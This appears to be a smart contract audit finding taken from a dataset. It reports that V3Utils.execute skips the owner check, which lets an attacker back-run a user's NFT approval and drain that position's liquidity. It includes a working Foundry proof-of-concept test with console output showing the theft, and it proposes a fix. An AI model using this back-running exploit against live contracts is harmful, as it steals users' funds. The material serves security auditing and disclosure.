# [H] `V3Utils.execute`

## Summary
Severity: High
Contest weight: 0.8573
Dataset id: 20965
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
When a user wants to use `V3Utils`, one of the flows stated by the protocol is as follows:

  * TX1: User calls `NPM.approve(V3Utils, tokenId)`.
  * TX2: User calls `V3Utils.execute()` with specific instructions.

Note that this can’t be done in one transaction since in TX1, the NPM has to be called directly by the EOA which owns the NFT. Thus, the `V3Utils.execute()` would have to be called in a subsequent transaction.

Now this is usually a safe design pattern, but the issue is that `V3Utils.execute()` does not validate the owner of the UniV3 Position NFT that is being handled. This allows anybody to provide arbitrary instructions and call `V3Utils.execute()` once the NFT has been approved in TX1.

A malicious actor provide instructions that include the following:

  1. `WhatToDo = WITHDRAW_AND_COLLECT_AND_SWAP`.
  2. `recipient = malicious_actor_address`.
  3. `liquidity = total_position_liquidity`.

This would collect all liquidity from the position that was approved, and send it to the malicious attacker who didn’t own the position.

## Proof of Concept
This foundry test demonstrates how an attacker can steal all the liquidity from a UniswapV3 position NFT that is approved to the V3Utils contract.

To run the PoC:

  1. Add the following foundry test to `test/integration/V3Utils.t.sol`.
  2. Run the command `forge test --via-ir --mt test_backRunApprovals_toStealAllFunds -vv` in the terminal.
```solidity
function test_backRunApprovals_toStealAllFunds() external {
    address attacker = makeAddr("attacker");

    uint256 daiBefore = DAI.balanceOf(attacker);
    uint256 usdcBefore = USDC.balanceOf(attacker);
    (,,,,,,, uint128 liquidityBefore,,,,) = NPM.positions(TEST_NFT_3);

    console.log("Attacker's DAI Balance Before: %e", daiBefore);
    console.log("Attacker's USDC Balance Before: %e", usdcBefore);
    console.log("Position #%s's liquidity Before: %e", TEST_NFT_3, liquidityBefore);

    // Malicious instructions used by attacker:
    V3Utils.Instructions memory bad_inst = V3Utils.Instructions(
        V3Utils.WhatToDo.WITHDRAW_AND_COLLECT_AND_SWAP,
        address(USDC), 0, 0, 0, 0, "", 0, 0, "", type(uint128).max, type(uint128).max, 0, 0, 0,
        liquidityBefore, // Attacker chooses to withdraw 100% of the position's liquidity
        0,
        0,
        block.timestamp,
        attacker, // Recipient address of tokens
        address(0),
        false,
        "",
        ""
    );

    // User approves V3Utils, planning to execute next
    vm.prank(TEST_NFT_3_ACCOUNT);
    NPM.approve(address(v3utils), TEST_NFT_3);
    
    console.log("\n--ATTACK OCCURS--\n");
    // User's approval gets back-ran
    vm.prank(attacker);
    v3utils.execute(TEST_NFT_3, bad_inst);
    
    uint256 daiAfter = DAI.balanceOf(attacker);
    uint256 usdcAfter = USDC.balanceOf(attacker);
    (,,,,,,, uint128 liquidityAfter,,,,) = NPM.positions(TEST_NFT_3);

    console.log("Attacker's DAI Balance After: %e", daiAfter);
    console.log("Attacker's USDC Balance After: %e", usdcAfter);
    console.log("Position #%s's liquidity After: %e", TEST_NFT_3, liquidityAfter);
}
```
Console output:
```
Ran 1 test for test/integration/V3Utils.t.sol:V3UtilsIntegrationTest
[PASS] test_backRunApprovals_toStealAllFunds() (gas: 351245)
Logs:
  Attacker's DAI Balance Before: 0e0
  Attacker's USDC Balance Before: 0e0
  Position #4660's liquidity Before: 1.2922419498089422291e19

--ATTACK OCCURS--

  Attacker's DAI Balance After: 4.2205702812280886591005e22
  Attacker's USDC Balance After: 3.5931648355e10
  Position #4660's liquidity After: 0e0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.17s

Ran 1 test suite in 1.17s: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommendation
```solidity
function execute(uint256 tokenId, Instructions memory instructions) public returns (uint256 newTokenId) {
    
    address tokenOwner = nonfungiblePositionManager.ownerOf(tokenId);
    if (tokenOwner != msg.sender && tokenOwner != address(this)) {
        revert Unauthorized();
    }
    
    /* REST OF CODE */
}
```
